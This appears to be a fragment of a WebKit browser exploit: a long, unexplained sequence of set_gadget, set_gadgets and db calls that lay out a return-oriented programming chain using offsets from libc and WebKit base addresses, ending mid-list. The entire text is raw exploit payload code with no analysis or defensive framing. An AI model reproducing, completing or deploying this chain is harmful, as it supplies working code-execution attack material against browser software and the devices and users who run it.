set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+144616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+144720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+144752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+144736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+144912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+144880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+144864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+145016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+145224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145192, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+145328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145312, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+145424, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+145512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+145528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+145688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+145640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+145744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+145848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+145880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+146040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145992, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146128, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+146344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146432, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+146560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+146680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+146824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+146840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+146808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+147000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+147128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147144, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+147112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147256, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147352, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+147456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+147440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147568, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147664, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147752, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+147816, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+147920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+147968, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+148064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+148048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4096, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+148376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+148568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+148680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65536, 0]); 
set_gadget(libc_base+788575,); 
db([65536, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+148808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+148792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+148960, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+157624, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+149056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+149112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([65536, 0]); 
set_gadget(libc_base+792472,); 
db([65536, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+149264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+149320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+149408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([312, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+149592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+149608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+149760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+149792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+149744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+149776, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+149888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+149872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+150104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150120, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+150240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+150224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+150368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+150536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+150520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150552, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+150664, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+150648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([15, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+150776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+150920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150904, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151056, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+151040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+151184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+151352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+151384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+151336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+151464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+151696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+151712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+151816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+151976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+152136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+152104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152120, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+152208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+152264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+152360, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+152448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+152616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+152648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+152600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+152768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+152784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+152752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+152872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+152928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+153016, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([40, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+153304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+153272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+153400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+153648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+153616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+153720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+153776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+153872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+154128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+154160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+154112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+154144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+154280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+154296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+154264, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+154384, 
